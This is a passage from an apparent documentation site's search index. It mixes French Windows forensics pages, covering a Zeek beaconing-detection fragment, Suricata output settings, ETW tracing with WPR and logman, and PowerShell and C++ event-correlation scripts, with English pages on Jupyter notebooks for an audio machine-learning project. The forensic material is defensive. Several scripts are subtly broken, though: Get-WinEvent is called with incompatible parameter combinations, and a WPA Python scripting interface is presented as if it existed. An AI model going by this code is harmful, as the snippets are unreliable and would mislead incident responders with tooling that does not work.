&gt; 300.0 &amp;&amp; bytes &lt; 1000) {\n        print fmt(\"Potential beaconing: %s -&gt; %s:%s\", c$id$orig_h, c$id$resp_h, c$id$resp_p);\n    }\n}\n</code></pre></p>"},{"location":"network-analysis/#suricata","title":"Suricata","text":"<p>Configuration Suricata <pre><code># suricata.yaml\nrule-files:\n  - suricata.rules\n  - emerging-threats.rules\n\noutputs:\n  - eve-log:\n      enabled: yes\n      filetype: regular\n      filename: eve.json\n      types:\n        - alert\n        - http\n        - dns\n        - tls\n        - files\n        - smtp\n</code></pre></p> <p>Cette approche m\u00e9thodique permet une analyse r\u00e9seau compl\u00e8te pour la d\u00e9tection d'activit\u00e9s malveillantes et la reconstruction d'\u00e9v\u00e9nements forensiques.</p>"},{"location":"notebooks/","title":"Jupyter Notebooks","text":""},{"location":"notebooks/#overview","title":"Overview","text":"<p>The Jupyter notebooks included in this project are designed for data exploration, model training, and experimentation. They provide an interactive environment where you can test different approaches, visualize results, and understand the inner workings of the AI system.</p>"},{"location":"notebooks/#available-notebooks","title":"Available Notebooks","text":""},{"location":"notebooks/#1-edaipynb-exploratory-data-analysis","title":"1. EDA.ipynb - Exploratory Data Analysis","text":"<p>Purpose: Comprehensive exploration of audio data and metadata</p> <p>Contents: - Audio Data Loading: Load and inspect various audio formats - Waveform Visualization: Plot time-domain audio signals - Spectral Analysis: Frequency domain analysis and spectrograms - Feature Distribution: Statistical analysis of extracted features - Metadata Exploration: Analyze effect parameters and labels - Data Quality Assessment: Identify missing or corrupted data - Genre Comparison: Compare audio characteristics across genres</p> <p>Key Outputs: - Audio visualizations (waveforms, spectrograms, mel-spectrograms) - Feature correlation matrices - Statistical summaries and distributions - Data quality reports</p>"},{"location":"notebooks/#2-model_trainingipynb-machine-learning-model-development","title":"2. Model_Training.ipynb - Machine Learning Model Development","text":"<p>Purpose: Build, train, and evaluate AI models for audio processing</p> <p>Contents: - Feature Engineering: Create and select optimal features - Model Architecture: Design ensemble models (CNN + RF + SVM) - Training Pipeline: Cross-validation and hyperparameter tuning - Performance Evaluation: Metrics, confusion matrices, and validation - Model Comparison: Compare different algorithms and architectures - Feedback Integration: Incorporate user feedback into training - Model Deployment: Save and version trained models</p> <p>Key Outputs: - Trained models (.pkl files) - Performance metrics and reports - Learning curves and validation plots - Feature importance analysis</p>"},{"location":"notebooks/#getting-started","title":"\ud83d\ude80 Getting Started","text":""},{"location":"notebooks/#prerequisites","title":"Prerequisites","text":"<p>Before running the notebooks, ensure you have the required dependencies installed:</p> <pre><code># Install core dependencies\npip install -r requirements.txt\n\n# Install Jupyter if not already installed\npip install jupyter notebook jupyterlab\n\n# Optional: Install additional visualization libraries\npip install seaborn plotly ipywidgets\n</code></pre>"},{"location":"notebooks/#launching-notebooks","title":"Launching Notebooks","text":"<ol> <li> <p>Start Jupyter Notebook:    <pre><code>jupyter notebook\n</code></pre></p> </li> <li> <p>Or use JupyterLab (recommended):    <pre><code>jupyter lab\n</code></pre></p> </li> <li> <p>Navigate to the notebooks directory:    <pre><code>cd notebooks/\n</code></pre></p> </li> </ol>"},{"location":"notebooks/#running-the-notebooks","title":"Running the Notebooks","text":""},{"location":"notebooks/#option-1-sequential-execution","title":"Option 1: Sequential Execution","text":"<ol> <li>Start with <code>EDA.ipynb</code> to understand your data</li> <li>Proceed to <code>Model_Training.ipynb</code> for model development</li> <li>Use the trained models for inference</li> </ol>"},{"location":"notebooks/#option-2-focused-exploration","title":"Option 2: Focused Exploration","text":"<ul> <li>Jump directly to specific sections based on your needs</li> <li>Use the table of contents in each notebook for navigation</li> <li>Modify parameters and experiment with different approaches</li> </ul>"},{"location":"notebooks/#eda-notebook-details","title":"\ud83d\udcca EDA Notebook Details","text":""},{"location":"notebooks/#data-loading-and-inspection","title":"Data Loading and Inspection","text":"<pre><code># Load audio data with metadata\naudio_data, metadata = load_audio_files_with_metadata(\"../data/audio_with_metadata/\")\n\n# Display basic information\nprint(f\"Total tracks: {len(audio_data)}\")\nprint(f\"Sample rate: {librosa.get_samplerate(list(audio_data.keys())[0])}\")\n</code></pre>"},{"location":"notebooks/#visualization-examples","title":"Visualization Examples","text":"<pre><code># Waveform visualization\nplt.figure(figsize=(12, 4))\nplt.plot(audio_data['track1.wav'][0])\nplt.title('Waveform')\nplt.xlabel('Sample')\nplt.ylabel('Amplitude')\n\n# Spectrogram\nD = librosa.stft(audio_data['track1.wav'][0])\nplt.figure(figsize=(12, 6))\nlibrosa.display.specshow(librosa.amplitude_to_db(np.abs(D)), sr=sr, x_axis='time', y_axis='hz')\nplt.colorbar()\nplt.title('Spectrogram')\n</code></pre>"},{"location":"notebooks/#feature-analysis","title":"Feature Analysis","text":"<pre><code># Extract and analyze features\nfeatures = extract_basic_features(audio_data)\n\n# Create feature distribution plots\nfeature_df = pd.DataFrame(features).T\nfeature_df.hist(bins=20, figsize=(15, 10))\nplt.tight_layout()\nplt.show()\n</code></pre>"},{"location":"notebooks/#model-training-notebook-details","title":"\ud83e\udd16 Model Training Notebook Details","text":""},{"location":"notebooks/#feature-engineering","title":"Feature Engineering","text":"<pre><code># Extract comprehensive features\nmfcc_features = extract_mfcc(audio_data, n_mfcc=13)\nspectral_features = extract_basic_features(audio_data)\n\n# Combine features\ncombined_features = combine_features(mfcc_features, spectral_features)\n</code></pre>"},{"location":"notebooks/#model-training","title":"Model Training","text":"<pre><code># Prepare data for training\nX, y = prepare_data_for_training(combined_features, metadata)\n\n# Split data\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Train ensemble model\nmodel = train_model(X_train, y_train)\n\n# Evaluate performance\naccuracy = model.score(X_test, y_test)\nprint(f\"Model accuracy: {accuracy:.3f}\")\n</code></pre>"},{"location":"notebooks/#model-evaluation","title":"Model Evaluation","text":"<pre><code># Generate predictions\ny_pred = model.predict(X_test)\n\n# Create confusion matrix\ncm = confusion_matrix(y_test, y_pred)\nplt.figure(figsize=(8, 6))\nsns.heatmap(cm, annot=True, fmt='d', cmap='Blues')\nplt.title('Confusion Matrix')\nplt.ylabel('Actual')\nplt.xlabel('Predicted')\n</code></pre>"},{"location":"notebooks/#best-practices","title":"\ud83c\udfaf Best Practices","text":""},{"location":"notebooks/#data-preparation","title":"Data Preparation","text":"<ol> <li>Consistent Format: Ensure all audio files have the same sample rate</li> <li>Quality Check: Verify audio files are not corrupted</li> <li>Metadata Validation: Check that metadata matches audio files</li> <li>Balanced Dataset: Ensure good representation across genres/effects</li> </ol>"},{"location":"notebooks/#model-training_1","title":"Model Training","text":"<ol> <li>Cross-validation: Use k-fold cross-validation for robust evaluation</li> <li>Hyperparameter Tuning: Use GridSearchCV for optimal parameters</li> <li>Feature Selection: Remove redundant or low-importance features</li> <li>Early Stopping: Monitor validation loss to prevent overfitting</li> </ol>"},{"location":"notebooks/#experimentation","title":"Experimentation","text":"<ol> <li>Version Control: Save different model versions for comparison</li> <li>Documentation: Add markdown cells explaining your approach</li> <li>Reproducibility: Set random seeds for consistent results</li> <li>Visualization: Create plots to understand model behavior</li> </ol>"},{"location":"notebooks/#customization","title":"\ud83d\udd27 Customization","text":""},{"location":"notebooks/#adding-new-features","title":"Adding New Features","text":"<pre><code>def extract_custom_features(audio_data):\n    \"\"\"Extract custom audio features\"\"\"\n    features = {}\n    for filename, (audio, _) in audio_data.items():\n        # Your custom feature extraction logic\n        custom_feature = your_feature_function(audio)\n        features[filename] = custom_feature\n    return features\n</code></pre>"},{"location":"notebooks/#creating-new-visualizations","title":"Creating New Visualizations","text":"<pre><code>def plot_feature_importance(model, feature_names):\n    \"\"\"Plot feature importance from trained model\"\"\"\n    importances = model.feature_importances_\n    indices = np.argsort(importances)[::-1]\n\n    plt.figure(figsize=(10, 6))\n    plt.title(\"Feature Importance\")\n    plt.bar(range(len(importances)), importances[indices])\n    plt.xticks(range(len(importances)), [feature_names[i] for i in indices], rotation=45)\n    plt.tight_layout()\n</code></pre>"},{"location":"notebooks/#experiment-tracking","title":"Experiment Tracking","text":"<pre><code># Track experiments\nexperiment_results = {\n    'model_type': 'ensemble',\n    'features': ['mfcc', 'spectral'],\n    'accuracy': accuracy,\n    'parameters': model.get_params(),\n    'timestamp': datetime.now()\n}\n\n# Save results\nwith open('experiment_log.json', 'a') as f:\n    json.dump(experiment_results, f)\n    f.write('\\n')\n</code></pre>"},{"location":"notebooks/#performance-monitoring","title":"\ud83d\udcc8 Performance Monitoring","text":""},{"location":"notebooks/#key-metrics-to-track","title":"Key Metrics to Track","text":"<ul> <li>Accuracy: Overall model performance</li> <li>Precision/Recall: Class-specific performance</li> <li>F1-Score: Balanced performance metric</li> <li>Training Time: Model efficiency</li> <li>Memory Usage: Resource consumption</li> </ul>"},{"location":"notebooks/#visualization-tools","title":"Visualization Tools","text":"<ul> <li>Learning Curves: Track training progress</li> <li>Validation Plots: Monitor overfitting</li> <li>Feature Importance: Understand model decisions</li> <li>Confusion Matrices: Detailed performance analysis</li> </ul>"},{"location":"notebooks/#troubleshooting","title":"\ud83d\udea8 Troubleshooting","text":""},{"location":"notebooks/#common-issues","title":"Common Issues","text":"<p>Memory Error: <pre><code># Solution: Process data in batches\nbatch_size = 32\nfor i in range(0, len(data), batch_size):\n    batch = data[i:i+batch_size]\n    # Process batch\n</code></pre></p> <p>Slow Training: <pre><code># Solution: Use fewer features or smaller models\nselected_features = select_k_best_features(X, y, k=50)\n</code></pre></p> <p>Poor Performance: <pre><code># Solution: Feature engineering or more data\n# Check data quality and feature distributions\n</code></pre></p>"},{"location":"notebooks/#tips-for-success","title":"\ud83d\udca1 Tips for Success","text":"<ol> <li>Start Simple: Begin with basic features and simple models</li> <li>Iterate Quickly: Make small changes and test frequently</li> <li>Document Everything: Keep notes on what works and what doesn't</li> <li>Visualize Results: Use plots to understand your data and models</li> <li>Collaborate: Share notebooks with team members for feedback</li> </ol>"},{"location":"notebooks/#additional-resources","title":"\ud83d\udd17 Additional Resources","text":"<ul> <li>LibROSA Documentation: Audio analysis library</li> <li>scikit-learn User Guide: Machine learning library</li> <li>TensorFlow Tutorials: Deep learning framework</li> <li>Jupyter Documentation: Notebook platform</li> </ul> <p>Explore the notebooks to get hands-on experience with the data and the models! Each notebook is designed to be educational and practical, helping you understand both the theory and implementation of AI-based audio processing.</p>"},{"location":"specific-artifacts/","title":"Artefacts Sp\u00e9cifiques Windows pour DFIR","text":""},{"location":"specific-artifacts/#windows-event-tracing-etw-traces-avancees","title":"Windows Event Tracing (ETW) - Traces avanc\u00e9es","text":""},{"location":"specific-artifacts/#vue-densemble-detw","title":"Vue d'ensemble d'ETW","text":"<p>Windows Event Tracing (ETW) est un m\u00e9canisme de trace haute performance int\u00e9gr\u00e9 \u00e0 Windows qui permet de capturer et d'analyser les \u00e9v\u00e9nements syst\u00e8me et d'applications en temps r\u00e9el.</p>"},{"location":"specific-artifacts/#architecture-etw","title":"Architecture ETW","text":"<p>Composants principaux - Providers : G\u00e9n\u00e9rateurs d'\u00e9v\u00e9nements - Controllers : Gestionnaires de sessions de trace - Consumers : Consommateurs d'\u00e9v\u00e9nements</p> <p>Types de providers - Manifest-based : D\u00e9finis par des fichiers manifestes - MOF-based : Ancienne m\u00e9thode (deprecated) - TraceLogging : API moderne pour d\u00e9veloppeurs</p>"},{"location":"specific-artifacts/#configuration-detw","title":"Configuration d'ETW","text":""},{"location":"specific-artifacts/#outils-de-configuration","title":"Outils de configuration","text":"<p>WPA (Windows Performance Analyzer) <pre><code># Lancement de WPA\nwpa.exe\n\n# Ouverture d'un fichier ETL\nwpa.exe -i trace.etl\n</code></pre></p> <p>WPR (Windows Performance Recorder) <pre><code># Profils disponibles\nwpr -profiles\n\n# D\u00e9marrage d'une trace\nwpr -start CPU -start DiskIO\n\n# Arr\u00eat et sauvegarde\nwpr -stop trace.etl\n</code></pre></p> <p>Logman <pre><code># Cr\u00e9er une session de trace\nlogman create trace MyTrace -p Microsoft-Windows-Kernel-Process -o trace.etl\n\n# D\u00e9marrer la trace\nlogman start MyTrace\n\n# Arr\u00eater la trace\nlogman stop MyTrace\n\n# Supprimer la session\nlogman delete MyTrace\n</code></pre></p>"},{"location":"specific-artifacts/#configuration-avancee","title":"Configuration avanc\u00e9e","text":"<p>Profils WPR personnalis\u00e9s <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;WindowsPerformanceRecorder Version=\"1.0\"&gt;\n  &lt;Profiles&gt;\n    &lt;SystemCollector Id=\"SystemCollector_Custom\" Name=\"Custom System Collector\"&gt;\n      &lt;BufferSize Value=\"1024\"/&gt;\n      &lt;Buffers Value=\"80\"/&gt;\n    &lt;/SystemCollector&gt;\n\n    &lt;EventCollector Id=\"EventCollector_Custom\" Name=\"Custom Event Collector\"&gt;\n      &lt;BufferSize Value=\"1024\"/&gt;\n      &lt;Buffers Value=\"80\"/&gt;\n    &lt;/EventCollector&gt;\n\n    &lt;SystemProvider Id=\"SystemProvider_Custom\"&gt;\n      &lt;Keywords&gt;\n        &lt;Keyword Value=\"ProcessThread\"/&gt;\n        &lt;Keyword Value=\"DiskIO\"/&gt;\n        &lt;Keyword Value=\"NetworkTrace\"/&gt;\n      &lt;/Keywords&gt;\n    &lt;/SystemProvider&gt;\n\n    &lt;EventProvider Id=\"Microsoft-Windows-Kernel-Process\" Name=\"Microsoft-Windows-Kernel-Process\"&gt;\n      &lt;Keywords&gt;\n        &lt;Keyword Value=\"0x10\"/&gt;\n      &lt;/Keywords&gt;\n    &lt;/EventProvider&gt;\n\n    &lt;Profile Id=\"Custom.Verbose.File\" Name=\"Custom\" Description=\"Custom profiling\" LoggingMode=\"File\" DetailLevel=\"Verbose\"&gt;\n      &lt;Collectors&gt;\n        &lt;SystemCollectorId Value=\"SystemCollector_Custom\"&gt;\n          &lt;SystemProviderId Value=\"SystemProvider_Custom\"/&gt;\n        &lt;/SystemCollectorId&gt;\n        &lt;EventCollectorId Value=\"EventCollector_Custom\"&gt;\n          &lt;EventProviderId Value=\"Microsoft-Windows-Kernel-Process\"/&gt;\n        &lt;/EventCollectorId&gt;\n      &lt;/Collectors&gt;\n    &lt;/Profile&gt;\n  &lt;/Profiles&gt;\n&lt;/WindowsPerformanceRecorder&gt;\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-traces-etw","title":"Analyse des traces ETW","text":""},{"location":"specific-artifacts/#parsing-des-fichiers-etl","title":"Parsing des fichiers ETL","text":"<p>PowerShell avec Get-WinEvent <pre><code># Lecture d'un fichier ETL\nGet-WinEvent -Path \"C:\\traces\\trace.etl\" | Select-Object TimeCreated, Id, LevelDisplayName, Message\n\n# Filtrage par provider\nGet-WinEvent -Path \"C:\\traces\\trace.etl\" -FilterHashtable @{ProviderName=\"Microsoft-Windows-Kernel-Process\"}\n\n# Filtrage par Event ID\nGet-WinEvent -Path \"C:\\traces\\trace.etl\" -FilterHashtable @{Id=1} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $processName = ($eventData | Where-Object {$_.Name -eq \"ImageFileName\"}).'#text'\n    $processId = ($eventData | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n    $parentId = ($eventData | Where-Object {$_.Name -eq \"ParentProcessId\"}).'#text'\n\n    Write-Host \"Process: $processName (PID: $processId, PPID: $parentId)\"\n}\n</code></pre></p> <p>Python avec python-etw <pre><code>import etw\n\ndef process_event(event_record):\n    \"\"\"Process ETW event\"\"\"\n    if event_record.EventHeader.ProviderId == \"{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}\":  # Kernel-Process\n        event_data = event_record.EventData\n        print(f\"Process Event: {event_data}\")\n\n# Cr\u00e9er un consumer ETW\nconsumer = etw.ETWConsumer()\nconsumer.start_trace(\"MyTrace\")\nconsumer.register_callback(process_event)\nconsumer.process_events()\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-evenements-specifiques","title":"Analyse des \u00e9v\u00e9nements sp\u00e9cifiques","text":"<p>Analyse des processus <pre><code># \u00c9v\u00e9nements de cr\u00e9ation de processus (Event ID 1)\nGet-WinEvent -Path \"trace.etl\" -FilterHashtable @{ProviderName=\"Microsoft-Windows-Kernel-Process\"; Id=1} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $processName = ($eventData | Where-Object {$_.Name -eq \"ImageFileName\"}).'#text'\n    $processId = ($eventData | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n    $parentId = ($eventData | Where-Object {$_.Name -eq \"ParentProcessId\"}).'#text'\n    $commandLine = ($eventData | Where-Object {$_.Name -eq \"CommandLine\"}).'#text'\n\n    [PSCustomObject]@{\n        TimeCreated = $_.TimeCreated\n        ProcessName = $processName\n        ProcessId = $processId\n        ParentProcessId = $parentId\n        CommandLine = $commandLine\n    }\n}\n</code></pre></p> <p>Analyse des acc\u00e8s fichiers <pre><code># \u00c9v\u00e9nements d'acc\u00e8s fichier\nGet-WinEvent -Path \"trace.etl\" -FilterHashtable @{ProviderName=\"Microsoft-Windows-Kernel-File\"} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $fileName = ($eventData | Where-Object {$_.Name -eq \"FileName\"}).'#text'\n    $processId = ($eventData | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n    $operation = ($eventData | Where-Object {$_.Name -eq \"Operation\"}).'#text'\n\n    [PSCustomObject]@{\n        TimeCreated = $_.TimeCreated\n        FileName = $fileName\n        ProcessId = $processId\n        Operation = $operation\n    }\n}\n</code></pre></p>"},{"location":"specific-artifacts/#correlation-avec-autres-artefacts","title":"Corr\u00e9lation avec autres artefacts","text":""},{"location":"specific-artifacts/#correlation-avec-event-logs","title":"Corr\u00e9lation avec Event Logs","text":"<p>Corr\u00e9lation ProcessId <pre><code># R\u00e9cup\u00e9rer les processus depuis ETW\n$etwProcesses = Get-WinEvent -Path \"trace.etl\" -FilterHashtable @{ProviderName=\"Microsoft-Windows-Kernel-Process\"; Id=1}\n\n# R\u00e9cup\u00e9rer les \u00e9v\u00e9nements de s\u00e9curit\u00e9\n$securityEvents = Get-WinEvent -LogName \"Security\" -FilterHashtable @{Id=4688}\n\n# Corr\u00e9ler par ProcessId et timestamp\nforeach ($etwProcess in $etwProcesses) {\n    $etwEvent = [xml]$etwProcess.ToXml()\n    $etwProcessId = ($etwEvent.Event.EventData.Data | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n    $etwTime = $etwProcess.TimeCreated\n\n    $correlatedEvents = $securityEvents | Where-Object {\n        $secEvent = [xml]$_.ToXml()\n        $secProcessId = ($secEvent.Event.EventData.Data | Where-Object {$_.Name -eq \"NewProcessId\"}).'#text'\n        $secTime = $_.TimeCreated\n\n        return $secProcessId -eq $etwProcessId -and (($secTime - $etwTime).TotalSeconds -lt 5)\n    }\n\n    if ($correlatedEvents) {\n        Write-Host \"Correlated process $etwProcessId at $etwTime\"\n    }\n}\n</code></pre></p>"},{"location":"specific-artifacts/#correlation-avec-sysmon","title":"Corr\u00e9lation avec Sysmon","text":"<p>Corr\u00e9lation multi-sources <pre><code>function Correlate-Events {\n    param(\n        [string]$ETWFile,\n        [datetime]$StartTime,\n        [datetime]$EndTime\n    )\n\n    # ETW Events\n    $etwEvents = Get-WinEvent -Path $ETWFile -FilterHashtable @{\n        ProviderName=\"Microsoft-Windows-Kernel-Process\"\n        StartTime=$StartTime\n        EndTime=$EndTime\n    }\n\n    # Sysmon Events\n    $sysmonEvents = Get-WinEvent -LogName \"Microsoft-Windows-Sysmon/Operational\" -FilterHashtable @{\n        StartTime=$StartTime\n        EndTime=$EndTime\n    }\n\n    # Security Events\n    $securityEvents = Get-WinEvent -LogName \"Security\" -FilterHashtable @{\n        StartTime=$StartTime\n        EndTime=$EndTime\n    }\n\n    $correlatedEvents = @()\n\n    foreach ($etwEvent in $etwEvents) {\n        $etwXml = [xml]$etwEvent.ToXml()\n        $etwProcessId = ($etwXml.Event.EventData.Data | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n        $etwTime = $etwEvent.TimeCreated\n\n        # Trouver les \u00e9v\u00e9nements Sysmon correspondants\n        $matchingSysmon = $sysmonEvents | Where-Object {\n            $sysmonXml = [xml]$_.ToXml()\n            $sysmonProcessId = ($sysmonXml.Event.EventData.Data | Where-Object {$_.Name -eq \"ProcessId\"}).'#text'\n            $sysmonTime = $_.TimeCreated\n\n            return $sysmonProcessId -eq $etwProcessId -and (($sysmonTime - $etwTime).TotalSeconds -lt 2)\n        }\n\n        if ($matchingSysmon) {\n            $correlatedEvents += [PSCustomObject]@{\n                ETWEvent = $etwEvent\n                SysmonEvents = $matchingSysmon\n                ProcessId = $etwProcessId\n                TimeCreated = $etwTime\n            }\n        }\n    }\n\n    return $correlatedEvents\n}\n</code></pre></p>"},{"location":"specific-artifacts/#outils-danalyse-etw","title":"Outils d'analyse ETW","text":""},{"location":"specific-artifacts/#wpa-windows-performance-analyzer","title":"WPA (Windows Performance Analyzer)","text":"<p>Configuration des vues <pre><code>&lt;!-- Custom WPA Profile --&gt;\n&lt;WpaProfile&gt;\n  &lt;TraceMergeProperties&gt;\n    &lt;TraceMergeProperty Id=\"Microsoft-Windows-Kernel-Process\" Name=\"Process Events\"/&gt;\n  &lt;/TraceMergeProperties&gt;\n\n  &lt;Views&gt;\n    &lt;View Title=\"Process Timeline\" Type=\"Timeline\"&gt;\n      &lt;Graphs&gt;\n        &lt;Graph Title=\"Process Creation\" Type=\"Line\"&gt;\n          &lt;Data&gt;\n            &lt;Series Name=\"ProcessId\" Type=\"Numeric\"/&gt;\n            &lt;Series Name=\"ProcessName\" Type=\"String\"/&gt;\n          &lt;/Data&gt;\n        &lt;/Graph&gt;\n      &lt;/Graphs&gt;\n    &lt;/View&gt;\n  &lt;/Views&gt;\n&lt;/WpaProfile&gt;\n</code></pre></p>"},{"location":"specific-artifacts/#krabsetw","title":"Krabsetw","text":"<p>Utilisation de Krabsetw (C++) <pre><code>#include &lt;krabs.hpp&gt;\n\nvoid analyze_etw_trace(const std::string&amp; etl_file) {\n    krabs::etl_file_reader reader(etl_file);\n\n    // Provider pour processus\n    krabs::provider&lt;&gt; kernel_process_provider(L\"Microsoft-Windows-Kernel-Process\");\n\n    // Callback pour \u00e9v\u00e9nements de processus\n    kernel_process_provider.on_event([](const krabs::event_record&amp; record) {\n        krabs::schema schema(record);\n\n        if (schema.event_id() == 1) {  // Process creation\n            auto process_id = schema.process_id();\n            auto image_name = schema.get_unicode_string(L\"ImageFileName\");\n            auto command_line = schema.get_unicode_string(L\"CommandLine\");\n\n            std::wcout &lt;&lt; L\"Process created: \" &lt;&lt; image_name \n                      &lt;&lt; L\" (PID: \" &lt;&lt; process_id \n                      &lt;&lt; L\", CMD: \" &lt;&lt; command_line &lt;&lt; L\")\" &lt;&lt; std::endl;\n        }\n    });\n\n    reader.add_provider(kernel_process_provider);\n    reader.start();\n}\n</code></pre></p>"},{"location":"specific-artifacts/#windows-performance-toolkit-analyse-des-performances","title":"Windows Performance Toolkit - Analyse des performances","text":""},{"location":"specific-artifacts/#vue-densemble-de-wpt","title":"Vue d'ensemble de WPT","text":"<p>Le Windows Performance Toolkit (WPT) est une collection d'outils de Microsoft pour l'analyse des performances syst\u00e8me, utile en forensique pour comprendre les comportements syst\u00e8me.</p>"},{"location":"specific-artifacts/#composants-principaux","title":"Composants principaux","text":"<p>WPR (Windows Performance Recorder) - Capture de traces syst\u00e8me - Profils pr\u00e9d\u00e9finis - Configuration personnalis\u00e9e</p> <p>WPA (Windows Performance Analyzer) - Analyse des traces - Visualisation des donn\u00e9es - Corr\u00e9lation d'\u00e9v\u00e9nements</p> <p>Xperf (ligne de commande) - Interface legacy - Scripting avanc\u00e9 - Automatisation</p>"},{"location":"specific-artifacts/#utilisation-de-wpt-pour-la-forensique","title":"Utilisation de WPT pour la forensique","text":""},{"location":"specific-artifacts/#capture-devenements-systeme","title":"Capture d'\u00e9v\u00e9nements syst\u00e8me","text":"<p>Profil de capture g\u00e9n\u00e9raliste <pre><code># D\u00e9marrer la capture\nwpr -start GeneralProfile -start CPU -start DiskIO -start Registry\n\n# Activit\u00e9 suspecte...\n\n# Arr\u00eater et sauvegarder\nwpr -stop forensic_trace.etl\n</code></pre></p> <p>Profil personnalis\u00e9 pour forensique <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;WindowsPerformanceRecorder Version=\"1.0\"&gt;\n  &lt;Profiles&gt;\n    &lt;SystemCollector Id=\"ForensicSystemCollector\" Name=\"Forensic System Collector\"&gt;\n      &lt;BufferSize Value=\"1024\"/&gt;\n      &lt;Buffers Value=\"128\"/&gt;\n    &lt;/SystemCollector&gt;\n\n    &lt;EventCollector Id=\"ForensicEventCollector\" Name=\"Forensic Event Collector\"&gt;\n      &lt;BufferSize Value=\"1024\"/&gt;\n      &lt;Buffers Value=\"128\"/&gt;\n    &lt;/EventCollector&gt;\n\n    &lt;SystemProvider Id=\"ForensicSystemProvider\"&gt;\n      &lt;Keywords&gt;\n        &lt;Keyword Value=\"ProcessThread\"/&gt;\n        &lt;Keyword Value=\"Loader\"/&gt;\n        &lt;Keyword Value=\"DiskIO\"/&gt;\n        &lt;Keyword Value=\"HardFaults\"/&gt;\n        &lt;Keyword Value=\"VirtualAlloc\"/&gt;\n        &lt;Keyword Value=\"NetworkTrace\"/&gt;\n        &lt;Keyword Value=\"Registry\"/&gt;\n      &lt;/Keywords&gt;\n    &lt;/SystemProvider&gt;\n\n    &lt;EventProvider Id=\"Microsoft-Windows-Kernel-Process\" Name=\"Microsoft-Windows-Kernel-Process\"&gt;\n      &lt;Keywords&gt;\n        &lt;Keyword Value=\"0xFFFFFFFFFFFFFFF\"/&gt;\n      &lt;/Keywords&gt;\n    &lt;/EventProvider&gt;\n\n    &lt;EventProvider Id=\"Microsoft-Windows-Security-Auditing\" Name=\"Microsoft-Windows-Security-Auditing\"&gt;\n      &lt;Keywords&gt;\n        &lt;Keyword Value=\"0xFFFFFFFFFFFFFFF\"/&gt;\n      &lt;/Keywords&gt;\n    &lt;/EventProvider&gt;\n\n    &lt;Profile Id=\"Forensic.Verbose.File\" Name=\"Forensic\" Description=\"Forensic investigation profile\" LoggingMode=\"File\" DetailLevel=\"Verbose\"&gt;\n      &lt;Collectors&gt;\n        &lt;SystemCollectorId Value=\"ForensicSystemCollector\"&gt;\n          &lt;SystemProviderId Value=\"ForensicSystemProvider\"/&gt;\n        &lt;/SystemCollectorId&gt;\n        &lt;EventCollectorId Value=\"ForensicEventCollector\"&gt;\n          &lt;EventProviderId Value=\"Microsoft-Windows-Kernel-Process\"/&gt;\n          &lt;EventProviderId Value=\"Microsoft-Windows-Security-Auditing\"/&gt;\n        &lt;/EventCollectorId&gt;\n      &lt;/Collectors&gt;\n    &lt;/Profile&gt;\n  &lt;/Profiles&gt;\n&lt;/WindowsPerformanceRecorder&gt;\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-traces-de-performance","title":"Analyse des traces de performance","text":"<p>Analyse des processus <pre><code># Extraire les donn\u00e9es de processus depuis WPA\nfunction Extract-ProcessData {\n    param([string]$ETLFile)\n\n    # Utiliser WPA en mode ligne de commande\n    $wpaScript = @\"\n    import sys\n    from wpa import *\n\n    # Ouvrir la trace\n    trace = Analysis()\n    trace.open('$ETLFile')\n\n    # Extraire les donn\u00e9es de processus\n    process_table = trace.get_table('Processes')\n\n    for row in process_table:\n        print(f\"Process: {row.Process}, PID: {row.ProcessId}, Start: {row.CreateTime}\")\n\"@\n\n    # Sauvegarder le script\n    $wpaScript | Out-File -FilePath \"extract_processes.py\"\n\n    # Ex\u00e9cuter avec WPA\n    wpa.exe -i $ETLFile -script extract_processes.py\n}\n</code></pre></p> <p>Analyse des I/O disque <pre><code>function Analyze-DiskIO {\n    param([string]$ETLFile)\n\n    # Script WPA pour analyser les I/O\n    $ioScript = @\"\n    trace = Analysis()\n    trace.open('$ETLFile')\n\n    # Table des I/O disque\n    disk_table = trace.get_table('Disk Usage')\n\n    suspicious_io = []\n\n    for row in disk_table:\n        if row.Size &gt; 10485760:  # 10MB\n            suspicious_io.append({\n                'Process': row.Process,\n                'File': row.FileName,\n                'Size': row.Size,\n                'Time': row.Timestamp\n            })\n\n    for io in suspicious_io:\n        print(f\"Large I/O: {io['Process']} -&gt; {io['File']} ({io['Size']} bytes)\")\n\"@\n\n    $ioScript | Out-File -FilePath \"analyze_disk_io.py\"\n    wpa.exe -i $ETLFile -script analyze_disk_io.py\n}\n</code></pre></p>"},{"location":"specific-artifacts/#correlation-avec-les-incidents","title":"Corr\u00e9lation avec les incidents","text":""},{"location":"specific-artifacts/#timeline-des-evenements","title":"Timeline des \u00e9v\u00e9nements","text":"<p>Cr\u00e9ation de timeline <pre><code>function Create-IncidentTimeline {\n    param(\n        [string]$ETLFile,\n        [datetime]$IncidentTime,\n        [int]$WindowMinutes = 30\n    )\n\n    $startTime = $IncidentTime.AddMinutes(-$WindowMinutes)\n    $endTime = $IncidentTime.AddMinutes($WindowMinutes)\n\n    # \u00c9v\u00e9nements ETW\n    $etwEvents = Get-WinEvent -Path $ETLFile -FilterHashtable @{\n        StartTime = $startTime\n        EndTime = $endTime\n    }\n\n    # \u00c9v\u00e9nements syst\u00e8me\n    $systemEvents = Get-WinEvent -LogName \"System\" -FilterHashtable @{\n        StartTime = $startTime\n        EndTime = $endTime\n    }\n\n    # \u00c9v\u00e9nements de s\u00e9curit\u00e9\n    $securityEvents = Get-WinEvent -LogName \"Security\" -FilterHashtable @{\n        StartTime = $startTime\n        EndTime = $endTime\n    }\n\n    # Combiner et trier\n    $allEvents = @()\n    $allEvents += $etwEvents | ForEach-Object { 